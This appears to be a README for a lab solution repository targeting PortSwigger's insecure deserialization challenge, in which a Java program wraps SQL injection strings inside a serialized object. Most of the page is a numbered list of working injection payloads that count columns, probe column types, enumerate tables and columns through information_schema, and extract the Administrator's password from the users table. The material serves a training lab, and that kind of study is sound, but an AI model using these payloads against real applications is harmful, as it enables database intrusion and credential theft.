# pslab-Java-deserialization

This repository shows a kind of Java deserialization exploit for the PortSwigger deserialization Lab.

[challenge link](https://portswigger.net/web-security/deserialization/exploiting#creating-your-own-exploit)

## Usage

1. Download the commons-cli jar file into current path from apache.

2. Compile the java file.

```bash
javac -cp ".;<your-jar-file-path>" Main.java
```

3. Run the java file.

```bash
java -cp ".;<your-jar-file-path>" Main -i <your-sqli-payload>
```


## sqli payloads

```bash
# step 1. Enumerate the number of columns
java -cp ".;commons-cli-1.5.0.jar" Main -i "'ORDER BY 8 --"
java -cp ".;commons-cli-1.5.0.jar" Main -i "'ORDER BY 9 --"

# step 2. Determine the data type of each column

java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT null, null, null, null, null, null, null, null --"
java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT 1, null, null, null, null, null, null, null --"
java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT null, null, null, null, 1, null, null, null --"

# step 3. List the content of database
java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT NULL,NULL,NULL,NULL,CAST(table_name AS numeric),null,null,null from information_schema.tables --"
java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT NULL,NULL,NULL,NULL, CAST(column_name AS numeric) ,null,null,null from information_schema.columns WHERE table_name='users' -- "
java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT NULL,NULL,NULL,NULL, CAST(column_name AS numeric) ,null,null,null from information_schema.columns WHERE table_name='users' and column_name != 'username' -- "

# step 4. Use a suitable SQL injection payload to extract the password from the users table
java -cp ".;commons-cli-1.5.0.jar" Main -i "'UNION SELECT NULL,NULL,NULL,NULL, CAST(password AS numeric) ,null,null,null from users WHERE username='Administrator' -- "
```